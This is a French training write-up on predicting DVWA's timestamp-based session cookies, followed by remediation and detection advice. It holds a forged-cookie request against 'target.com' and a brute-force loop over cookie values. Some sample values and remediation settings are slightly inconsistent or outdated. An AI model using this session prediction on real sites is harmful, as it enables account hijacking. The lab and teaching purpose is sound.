# Write-Up / Weak Session IDs / Predictable Session Prediction

## Résumé 

Ce rapport documente l'exploitation d'une vulnérabilité de génération de session ID prédictible sur DVWA au niveau "Medium". L'application génère ses identifiants de session à partir du timestamp Unix courant, créant un motif facilement déductible par un attaquant. L'attaque a consisté à analyser le pattern, identifier la fonction PHP `time()` utilisée, et prédire des session IDs valides pour usurper des sessions utilisateur.

**Résultat** : Identification du pattern temporel + prédiction d'un session ID valide à partir d'une date future.

**Session ID prédit pour le 6 juin 2025 à minuit** : `dvwaSession=1749168000`

**Sévérité** : Élevée (CVSS estimé 7.5 / Session Prediction / Authentication Bypass)

---

## 1. Contexte et environnement

### Cible
- **Application** : DVWA (Damn Vulnerable Web Application)
- **Niveau de sécurité** : Medium
- **Module ciblé** : Weak Session IDs
- **URL** : `http://[DVWA-IP]/vulnerabilities/weak_id/`

### Outils utilisés
- Burp Suite Community (proxy HTTP, Repeater)
- PHP interpreter (CLI ou online compiler Programiz)
- Navigateur Firefox avec FoxyProxy

---

## 2. Comprendre les Session IDs / Théorie

### Qu'est-ce qu'un Session ID ?

Le protocole HTTP est **stateless** / chaque requête est indépendante, le serveur ne se souvient pas qui tu es entre deux requêtes. Pour pallier cela, les applications web utilisent un **identifiant de session** (session ID), une chaîne unique stockée côté client (généralement dans un cookie) et envoyée à chaque requête.

```
Requête 1 : POST /login (username + password)
            ← Set-Cookie: SESSIONID=abc123xyz...
            
Requête 2 : GET /dashboard
            Cookie: SESSIONID=abc123xyz...
            → Le serveur reconnaît la session, autorise l'accès
            
Requête 3 : GET /profile
            Cookie: SESSIONID=abc123xyz...
            → Toujours reconnu
```

### Pourquoi le Session ID est critique

Le session ID **EST** l'authentification après le login. Quiconque possède ton session ID :
- Peut accéder à ton compte sans connaître ton mot de passe
- Voit tes données privées
- Effectue des actions en ton nom
- Reste connecté tant que la session est valide

C'est l'équivalent numérique des clés de ta voiture.

### Les caractéristiques d'un bon Session ID

Selon OWASP, un session ID sécurisé doit être :

1. **Aléatoire** / Généré par un CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)
2. **Long** / Minimum 128 bits d'entropie (16 caractères aléatoires complets)
3. **Imprédictible** / Impossible de deviner le suivant à partir du précédent
4. **Unique** / Jamais réutilisé
5. **Expirable** / Durée de vie limitée + invalidation au logout

**Exemple de session ID sécurisé** :
```
session=R8kP3xY9mNqL2zW7vF5jH4cD1bA6tG0e
```

**Exemple de session ID faible (cas DVWA)** :
```
dvwaSession=1745107200
```

---

## 3. Phase de reconnaissance

### 3.1 Configuration et accès

Configuration de Burp Suite comme proxy HTTP, ouverture du navigateur sur la page Weak Session IDs de DVWA au niveau Medium.

L'interface présente un bouton "Generate" qui produit un nouveau session ID à chaque clic.

### 3.2 Capture du premier session ID

Premier clic sur "Generate" / Burp intercepte la requête :

```http
POST /vulnerabilities/weak_id/ HTTP/1.1
Host: dvwa.local
Cookie: PHPSESSID=...; security=medium

Generate=Generate
```

**Réponse du serveur** :

```http
HTTP/1.1 200 OK
Set-Cookie: dvwaSession=1745107200; HttpOnly
Content-Type: text/html

<form>
    ...
</form>
```

**Observation** : Un cookie `dvwaSession=1745107200` est défini. La valeur ressemble à un nombre entier de 10 chiffres.

### 3.3 Tests itératifs / Identification du pattern

J'envoie la requête vers Repeater dans Burp Suite et je clique plusieurs fois sur "Send" rapidement :

**Tentative 1** (à T+0 seconde) :
```
Set-Cookie: dvwaSession=1745107200
```

**Tentative 2** (à T+1 seconde) :
```
Set-Cookie: dvwaSession=1745107201
```

**Tentative 3** (à T+3 secondes) :
```
Set-Cookie: dvwaSession=1745107204
```

**Tentative 4** (à T+5 secondes) :
```
Set-Cookie: dvwaSession=1745107209
```

**Pattern identifié** : La valeur du session ID **augmente d'environ 1 par seconde**. C'est un **timestamp Unix** / le nombre de secondes écoulées depuis le 1er janvier 1970 (epoch Unix).

### 3.4 Vérification de l'hypothèse

Conversion du timestamp `1745107200` en date lisible :

```bash
date -d @1745107200
# Sortie : dimanche 20 avril 2025, 02:00:00 CEST
```

Confirmation. Le session ID est exactement le timestamp Unix de génération.

---

## 4. Analyse du code source

L'application DVWA permet de consulter le code source PHP au niveau Medium :

```php
// vulnerabilities/weak_id/source/medium.php
<?php
$cookie_value = time();
setcookie("dvwaSession", $cookie_value);
?>
```

**Décomposition de la vulnérabilité** :

1. `time()` / Fonction PHP qui retourne le timestamp Unix courant
2. La valeur est directement utilisée comme session ID
3. Aucune randomisation, aucun hashage, aucun salt
4. Le cookie est setté sans flags de sécurité (pas de `Secure`, pas de `SameSite`)

**Le défaut fondamental** : Un timestamp n'est ni aléatoire, ni imprédictible. C'est une fonction monotone du temps. À tout moment T, n'importe qui sachant l'heure exacte peut calculer le session ID généré.

---

## 5. Phase d'exploitation / Prédiction de session ID

### 5.1 Stratégie d'attaque

L'objectif est de prédire un session ID valide pour une date/heure future donnée, sans aucune interaction avec l'application cible.

**Scénario attaquant** :
1. Un utilisateur va se connecter le 6 juin 2025 à minuit exactement
2. À ce moment, son session ID sera `time()` = timestamp Unix du 6 juin 2025 00:00:00
3. Si je calcule ce timestamp à l'avance, je peux forger un cookie avec cette valeur
4. Je présente ce cookie au serveur juste après la connexion de la victime
5. Le serveur croit que je suis la victime

### 5.2 Calcul du timestamp Unix

PHP fournit la fonction `mktime()` pour générer un timestamp depuis une date :

```php
<?php
// mktime(heure, minute, seconde, mois, jour, année)
$session_id = mktime(0, 0, 0, 6, 6, 2025);
echo "dvwaSession=" . $session_id . "\n";
?>
```

**Décomposition des paramètres** :
- `0` / heure (minuit)
- `0` / minute
- `0` / seconde
- `6` / mois (juin)
- `6` / jour
- `2025` / année

### 5.3 Exécution du script

**Méthode 1 / PHP en local** :
```bash
php weak_session_id.php
```

**Méthode 2 / Online compiler (Programiz, replit, etc.)** :
Coller le code dans l'interface en ligne et exécuter.

**Résultat** :
```
dvwaSession=1749168000
```

### 5.4 Vérification par conversion inverse

```bash
date -d @1749168000
# Sortie : vendredi 6 juin 2025, 00:00:00 UTC
```

Le timestamp correspond exactement à minuit le 6 juin 2025. Si l'application génère effectivement ses session IDs avec `time()`, alors `1749168000` sera un session ID valide à cette date.

### 5.5 Exploitation pratique en situation réelle

Dans un scénario d'attaque réel, voici comment je l'utiliserais :

```http
# Capture du timing exact de la connexion de la victime (via timing attack ou observation réseau)
# Calcul du timestamp à ±1 seconde de la connexion

POST /protected-page HTTP/1.1
Host: target.com
Cookie: dvwaSession=1749168000

→ Si correct : session de la victime usurpée
→ Si incorrect : tester 1749168001, 1749167999, etc. (fenêtre de ±10 secondes)
```

**Optimisation** : Comme le timestamp est prédictible à la seconde près, je peux automatiser un script qui teste rapidement quelques centaines de valeurs autour du moment de connexion estimé.

```bash
# Pseudo-code d'exploitation automatisée
for offset in range(-30, 31):
    timestamp = base_timestamp + offset
    response = requests.get(target, cookies={'dvwaSession': str(timestamp)})
    if 'admin' in response.text or 'logged' in response.text:
        print(f"Session ID valide trouvé : {timestamp}")
        break
```

---

## 6. Analyse de la cause racine

### 6.1 Erreur fondamentale / Confondre "aléatoire" et "imprédictible"

Le développeur a pensé que le timestamp était "suffisamment unique" pour servir de session ID. C'est techniquement vrai (deux session IDs générés à la même seconde seront identiques, mais la précision à la seconde est généralement suffisante pour différencier des utilisateurs).

**Le problème** : Unicité ≠ Imprédictibilité. Un session ID doit avoir les deux propriétés.

### 6.2 Erreur 2 / Utilisation de `time()` au lieu d'un CSPRNG

PHP propose plusieurs fonctions de génération aléatoire :

```php
// MAUVAIS / Prédictible
$session = time();
$session = uniqid();           // Aussi basé sur le temps !
$session = rand();             // Pas cryptographiquement sûr
$session = mt_rand();          // Idem

// BON / Cryptographiquement sûr
$session = bin2hex(random_bytes(32));    // 64 caractères hex (256 bits d'entropie)
$session = session_create_id();          // Fonction native PHP dédiée
```

**Pourquoi `random_bytes()`** : Cette fonction utilise le générateur d'aléatoire cryptographique de l'OS (`/dev/urandom` sur Linux, CryptGenRandom sur Windows). Imprédictible par construction.

### 6.3 Erreur 3 / Absence de flags de sécurité sur le cookie

```php
// Code vulnérable
setcookie("dvwaSession", $cookie_value);

// Code sécurisé
setcookie("dvwaSession", $cookie_value, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,        // HTTPS uniquement
    'httponly' => true,      // Inaccessible via JavaScript (anti-XSS)
    'samesite' => 'Strict'   // Anti-CSRF
]);
```

---

## 7. Impact opérationnel d'une session prédictible

### 7.1 Scénarios d'attaque réalistes

**Scénario 1 / Session Hijacking ciblé**

Un attaquant observe le moment de connexion d'une cible spécifique (timing analysis, observation réseau). Il calcule le session ID probable et le teste immédiatement.

**Scénario 2 / Brute force massif**

L'attaquant teste tous les session IDs possibles dans une fenêtre temporelle (par exemple, toutes les valeurs entre `now - 1 hour` et `now`). Avec un timestamp limité à un range de 3600 valeurs/heure, c'est trivial à automatiser.

**Scénario 3 / Pré-calcul d'attaques futures**

L'attaquant pré-calcule tous les session IDs pour une période donnée. Au moment où la victime se connecte, il tente immédiatement avec sa liste pré-calculée.

### 7.2 Multiplication de l'impact

Cette vulnérabilité combinée avec d'autres défauts peut être dévastatrice :

- **+ XSS** / L'attaquant peut récupérer le timestamp côté client et générer le session ID
- **+ Pas d'IP binding** / L'attaquant utilise le session ID depuis n'importe quelle IP
- **+ Session ne meurt jamais** / Une fois prédite, la session reste valide indéfiniment
- **+ Pas de re-authentification** / L'attaquant accède à toutes les fonctions sensibles

---

## 8. Recommandations de remédiation

### Solution 1 / Génération aléatoire cryptographique

```php
<?php
// Solution recommandée
function generateSessionId() {
    return bin2hex(random_bytes(32));  // 256 bits d'entropie
}

$session_id = generateSessionId();
setcookie("dvwaSession", $session_id, [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
?>
```

### Solution 2 / Utiliser le système de sessions natif PHP

PHP gère nativement des sessions sécurisées. Pas besoin de réinventer la roue :

```php
<?php
// Configuration sécurisée dans php.ini ou en runtime
ini_set('session.use_only_cookies', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
ini_set('session.entropy_length', 32);
ini_set('session.hash_function', 'sha256');

session_start();
// PHP génère automatiquement un session ID sécurisé
?>
```

### Solution 3 / Implémentation avancée

Pour les applications critiques, ajouter des couches supplémentaires :

```php
<?php
session_start();

// Régénérer le session ID après login (prévient session fixation)
session_regenerate_id(true);

// Lier la session à l'IP (avec précaution sur les NATs et proxies)
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

// Lier au User-Agent
$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];

// Vérification à chaque requête
if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR'] || 
    $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
    session_destroy();
    header('Location: /login');
    exit;
}

// Expiration absolue
if (time() - $_SESSION['created_at'] > 3600) {
    session_destroy();
    header('Location: /login');
    exit;
}
?>
```

### Solution 4 / Monitoring et détection

Côté Blue Team, mettre en place de la détection :

```
Alertes SIEM à configurer :
- Multiples session IDs séquentiels testés en peu de temps (brute force)
- Session ID utilisé depuis plusieurs IPs simultanément (hijacking)
- Session ID utilisé depuis un User-Agent différent du login
- Patterns de requêtes anormaux (automation détectée)
```

---

## 9. Concepts cryptographiques à retenir

### Entropie / La vraie mesure de robustesse

L'entropie mesure l'imprédictibilité d'une valeur. Plus l'entropie est élevée, plus c'est difficile à deviner.

| Type | Entropie approximative | Force |
|---|---|---|
| Timestamp Unix (1 seconde) | ~31 bits sur 1 an | Très faible |
| `uniqid()` PHP | ~52 bits | Faible (basé sur le temps) |
| `mt_rand()` PHP | 32 bits | Moyenne (prévisible avec assez d'échantillons) |
| `random_bytes(32)` | 256 bits | Robuste |
| UUID v4 | 122 bits | Robuste |

**Règle OWASP** : Minimum 64 bits d'entropie pour un session ID. Recommandé 128 bits ou plus.

### PRNG vs CSPRNG

- **PRNG (Pseudo-Random Number Generator)** / `rand()`, `mt_rand()`, `time()` / Reproductible si on connaît la graine. À éviter pour la sécurité.
- **CSPRNG (Cryptographically Secure PRNG)** / `random_bytes()`, `/dev/urandom`, `crypto.randomBytes()` (Node.js) / Conçu pour résister aux attaques. À utiliser pour tout ce qui touche à la sécurité.

---

## 10. Compétences démontrées

### Sécurité offensive
- Identification de patterns prédictibles dans les valeurs
- Analyse de comportement applicatif par tests itératifs
- Compréhension des timestamps Unix et de l'epoch
- Prédiction de valeurs futures à partir de l'observation
- Compréhension des CSPRNG vs PRNG

### Outils et technologies
- Burp Suite (proxy, Repeater pour tests itératifs)
- PHP (mktime, time, lecture de code source)
- Manipulation de timestamps Unix
- Compréhension des cookies HTTP et leurs flags

### Méthodologie
- Reconnaissance du mécanisme d'authentification
- Identification de pattern via observations multiples
- Validation d'hypothèse par conversion temporelle
- Analyse de code source pour confirmation
- Calcul prédictif de valeurs futures
- Analyse de causes racines (entropie, CSPRNG)

---

## 11. Chaîne d'attaque complète résumée

```
1. Reconnaissance
   Accès au module Weak Session IDs (DVWA Medium)
   Bouton "Generate" → cookie dvwaSession=1745107200 retourné

2. Identification du pattern
   Tests itératifs dans Burp Repeater
   Observation : la valeur augmente d'environ 1 par seconde
   Hypothèse : c'est un timestamp Unix

3. Validation
   date -d @1745107200 → "20 avril 2025, 02:00:00"
   Confirmation : c'est bien un timestamp Unix

4. Analyse du code source
   medium.php : $cookie_value = time();
   Vulnérabilité confirmée : aucune randomisation

5. Calcul prédictif
   PHP : mktime(0, 0, 0, 6, 6, 2025) = 1749168000
   Pour le 6 juin 2025 à minuit, le session ID sera 1749168000

6. Exploitation théorique
   À 00:00:00 le 6 juin 2025, envoyer une requête avec :
   Cookie: dvwaSession=1749168000
   → Session de l'utilisateur connecté à ce moment usurpée
```

---

## 12. Comparaison avec les autres vulnérabilités du portfolio

| Vulnérabilité | Type | Méthode | Difficulté |
|---|---|---|---|
| SQLi (DVWA Medium) | Injection | Manipulation de paramètres | Moyenne |
| XSS Reflected (DVWA Medium) | Injection | Bypass de filtre | Faible |
| SSTI Jinja2 | Injection | Exploitation moteur de templates | Moyenne-Élevée |
| JWT Privilege Escalation | Authentication Bypass | Cracking + forge cryptographique | Moyenne |
| Weak Session IDs (ce write-up) | Session Prediction | Analyse de pattern temporel | Faible-Moyenne |

Cette vulnérabilité appartient à la catégorie OWASP **A07:2021 - Identification and Authentication Failures**. Elle illustre que la sécurité n'est pas qu'une question de filtrage d'entrée / les défauts cryptographiques (mauvaise randomisation) sont tout aussi critiques.

---

## 13. Ressources et références

- **OWASP Session Management Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- **OWASP A07:2021 - Identification and Authentication Failures** : https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
- **PHP Documentation - random_bytes** : https://www.php.net/manual/en/function.random-bytes.php
- **PHP Documentation - mktime** : https://www.php.net/manual/en/function.mktime.php
- **PHP Documentation - session_create_id** : https://www.php.net/manual/en/function.session-create-id.php
- **Unix Timestamp Converter** : https://www.unixtimestamp.com/
- **PortSwigger Web Security Academy - Authentication** : https://portswigger.net/web-security/authentication

---

*Write-up rédigé lors de la formation Jedha Cybersécurité / Fullstack RNCP Niveau 6*
